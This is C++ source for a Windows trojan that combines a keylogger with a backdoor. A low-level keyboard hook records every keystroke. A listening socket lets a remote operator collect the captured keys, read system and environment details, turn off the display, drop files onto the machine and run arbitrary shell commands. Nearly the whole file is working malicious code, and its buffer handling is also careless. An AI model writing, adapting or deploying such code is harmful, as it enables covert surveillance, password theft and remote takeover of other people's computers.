// Preprocessor
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib,"ws2_32.lib")

// Libraries
#include <fstream>
#include <iostream>
#include <sstream>
#include <winsock2.h>
#include <string>
#include <Windows.h>
#include "FileHandler.h"

#define MONITOR_OFFT 5

using namespace std;

// Global Variables
stringstream TroyKeys, sinfo;
int TroyErr, dataLength, TroyResult;
char inBuff[MEM_SIZE];
char* TroyCopiedKeys = NULL;
SOCKADDR_IN serverinfo;
SOCKET connSocket,Temp;

// Function Declaration
int TroyBindServer(void);
char* exec(const char*);
bool IsCapsLockOn(void);
bool TroyStart(void);
void AttackLoop(void);
void TroyListenOn(void);
void TroyAcceptConnection(void);
void TroyGetCommands(void);
LRESULT CALLBACK LowLevelKeyboardProc(int, WPARAM, LPARAM);

// Main Program
int main(){
    HANDLE TroyGate;
    DWORD  TroyGateID;
    MSG msg;

    TroyGate = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)AttackLoop, NULL, NULL, &TroyGateID);
    HHOOK TroyKeyBoard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);

    while(!GetMessage(&msg, NULL, NULL, NULL)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(TroyKeyBoard);
}


// Program Functions
void AttackLoop(){
    TroyStart();
    TroyBindServer();
    TroyListenOn();
    TroyAcceptConnection();
    TroyGetCommands();
}

bool IsCapsLockOn(){
    if ((GetKeyState(VK_CAPITAL) && 0x00001) != 0) return true;
    else return false;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    PKBDLLHOOKSTRUCT p =(PKBDLLHOOKSTRUCT)lParam;

    if (wParam == WM_KEYDOWN){

        // 0 to 9 with SHIFT key
        if (p->vkCode >= 0x30 && p->vkCode <= 0x39){
            switch (p->vkCode){
                case 0x30: if (GetAsyncKeyState(VK_SHIFT)) TroyKeys << ')';		else TroyKeys << '0';		 break;
                case 0x31: if (GetAsyncKeyState(VK_SHIFT)) TroyKeys << '!';		else TroyKeys << '1';		 break;
                case 0x32: if (GetAsyncKeyState(VK_SHIFT)) TroyKeys << '@';		else TroyKeys << '2';		 break;
                case 0x33: if (GetAsyncKeyState(VK_SHIFT)) TroyKeys << '#';		else TroyKeys << '3';		 break;
                case 0x34: if (GetAsyncKeyState(VK_SHIFT)) TroyKeys << '$';		else TroyKeys << '4';		 break;
                case 0x35: if (GetAsyncKeyState(VK_SHIFT)) TroyKeys << '%';		else TroyKeys << '5';		 break;
                case 0x36: if (GetAsyncKeyState(VK_SHIFT)) TroyKeys << '^';		else TroyKeys << '6';		 break;
                case 0x37: if (GetAsyncKeyState(VK_SHIFT)) TroyKeys << '&';		else TroyKeys << '7';		 break;
                case 0x38: if (GetAsyncKeyState(VK_SHIFT)) TroyKeys << '*';		else TroyKeys << '8';		 break;
                case 0x39: if (GetAsyncKeyState(VK_SHIFT)) TroyKeys << '(';		else TroyKeys << '9';		 break;
			}
        }

        /*  A to z
            SHIFT   CAP     LOWER   UPPER --> (SHIFT XOR CAP)
                0     0         1       0
                0     1         0       1
                1     0         0       1
                1     1         1       0
        */

        else if (p->vkCode >= 0x41 && p->vkCode <= 0x5A){

            if (!(GetAsyncKeyState(VK_SHIFT) ^ IsCapsLockOn())) TroyKeys << char(tolower(p->vkCode));
            else TroyKeys << (char)p->vkCode;
        }

        // Function Keys
        else if (p->vkCode >= 0x70 && p->vkCode <= 0x7B) TroyKeys << "[F" << (p->vkCode - 111) << "]";

        // Other Keys
        else{
            switch (p->vkCode)
			{
                //case VK_CAPITAL:	TroyKeys << "<CAPLOCK>";	break;
                case VK_LCONTROL:	TroyKeys << "<LCTRL>";		break;
                case VK_RCONTROL:	TroyKeys << "<RCTRL>";		break;
                case VK_INSERT:		TroyKeys << "<INSERT>";		break;
                case VK_END:		TroyKeys << "<END>";		break;
                case VK_PRINT:		TroyKeys << "<PRINT>";		break;
                case VK_DELETE:		TroyKeys << "<DEL>";		break;
                case VK_BACK:		TroyKeys << "<BK>";			break;
                case VK_LEFT:		TroyKeys << "<LEFT>";		break;
                case VK_RIGHT:		TroyKeys << "<RIGHT>";		break;
                case VK_UP:			TroyKeys << "<UP>";			break;
                case VK_DOWN:		TroyKeys << "<DOWN>";		break;
                case VK_SPACE:		TroyKeys << ' ';			break;
                case VK_ESCAPE:		TroyKeys << "<ESC>";		break;
                case VK_TAB:		TroyKeys << "<TAB>";		break;
			}
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);

}

char* exec(const char* cmd) {
    char buffer[128];
    string result = "";
    FILE* pipe = popen(cmd, "r");
    if (!pipe){
        result = "Unable to readeth STDOUT";
    }
    else{
        while (fgets(buffer, sizeof buffer, pipe) != NULL) result += buffer;
    }
    pclose(pipe);
    return (char*)result.c_str();
}


// Troy

int TroyBindServer() {
    if (bind(connSocket, (SOCKADDR*)&serverinfo, sizeof(serverinfo)) == SOCKET_ERROR) {
		cout << "[-] Unable to bindeth socket!";
		WSACleanup();
		return 0;
	}
}

void TroyListenOn() {
	listen(connSocket, 5);
}

void TroyAcceptConnection() {
	Temp = SOCKET_ERROR;
	while (Temp == SOCKET_ERROR){
		Temp = accept(connSocket, NULL, NULL);
	}
	connSocket = Temp;
}

bool TroyStart() {
	WSADATA wsaData;
	TroyErr = WSAStartup(MAKEWORD(2, 2), &wsaData);

	if (TroyErr != 0) {
		cout << "WSAstartup did fail." << endl; // [*] can be deleted.
		return false;
	}

	connSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	serverinfo.sin_family = AF_INET;
	serverinfo.sin_addr.s_addr = INADDR_ANY;
	serverinfo.sin_port = htons(DESTPORT);

	return true;
}

void TroyGetCommands() {

    char *sv_msg = NULL;
    char nfwrite[16];
	memset(inBuff, 0, MEM_SIZE);
	dataLength = 0;
	TroyResult = WSAGetLastError();

	DWORD nWritten, nRead;

	while (TroyResult == 0) {
		dataLength = recv(connSocket, inBuff, sizeof(inBuff), 0);

        // Halt
		if (strcmp(inBuff, "Halt") == 0){
            exit(1);
		}

		// Get system info
		else if (strcmp(inBuff, "Info") == 0){
            SYSTEM_INFO siSysInfo;
            GetSystemInfo(&siSysInfo);

            sinfo << "Hardware information: " << endl;
            sinfo << "  Allocation Granularity: " << siSysInfo.dwAllocationGranularity << endl;
            sinfo << "  Processor Architecture: " << siSysInfo.wProcessorArchitecture << endl;
            sinfo << "  Processor Level: " << siSysInfo.wProcessorLevel << endl;
            sinfo << "  Processor Revision: " << siSysInfo.wProcessorRevision << endl;
            sinfo << "  OEM ID: " << siSysInfo.dwOemId << endl;
            sinfo << "  Number of processors: " << siSysInfo.dwNumberOfProcessors << endl;
            sinfo << "  Page size: " << siSysInfo.dwPageSize << endl;
            sinfo << "  Processor type: " << siSysInfo.dwProcessorType << endl;
            sinfo << "  Minimum application address: " << siSysInfo.lpMinimumApplicationAddress << endl;
            sinfo << "  Maximum application address: " << siSysInfo.lpMaximumApplicationAddress << endl;
            sinfo << "  Active processor mask: " << siSysInfo.dwActiveProcessorMask << endl;

            sinfo << "\nSoftware information: " << endl;
            sinfo << "  USERPROFILE: " << getenv("USERPROFILE") << endl;
            sinfo << "  OS: " << getenv("OS") << endl;
            sinfo << "  SYSTEMDRIVE: " << getenv("SystemDrive") << endl;
            sinfo << "  USERDOMAIN: " << getenv("USERDOMAIN") << endl;
            sinfo << "  PATH: " << getenv("PATH") << endl;

            string sistr = sinfo.str();
            const char* sichar = sistr.c_str();

            send(connSocket, (char*)sichar, strlen((char*)sichar), 0);
		}

		// Turn off Monitor
		else if (strcmp(inBuff, "Monitor") == 0){
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
            Sleep(MONITOR_OFFT * 1000);
		}

        // Get KeyLogs
        else if (strcmp(inBuff, "Keys") == 0){
            send(connSocket, TroyKeys.str().c_str(), strlen(TroyKeys.str().c_str()), 0);
        }

        // Receive a File
        else if (strcmp(inBuff, "SendFile") == 0){
            // Get Filename
            ZeroMemory(inBuff, MEM_SIZE);
            recv(connSocket, inBuff, sizeof(inBuff), 0);
            strcpy(nfwrite, inBuff);
            Sleep(100);

            // Get File
            ZeroMemory(inBuff, MEM_SIZE);
            recv(connSocket, inBuff, sizeof(inBuff), 0);
            strcpy(stdWriteStream, inBuff);
            fhWriteFile(nfwrite);

            // EOT
            sv_msg = "Transfer End";
            send(connSocket, sv_msg, strlen(sv_msg), 0);
        }

		// Invalid
        else{
            sv_msg = exec(inBuff);
            send(connSocket, sv_msg, strlen(sv_msg), 0);
        }

		ZeroMemory(inBuff, MEM_SIZE);
		TroyResult = WSAGetLastError();

	}

}
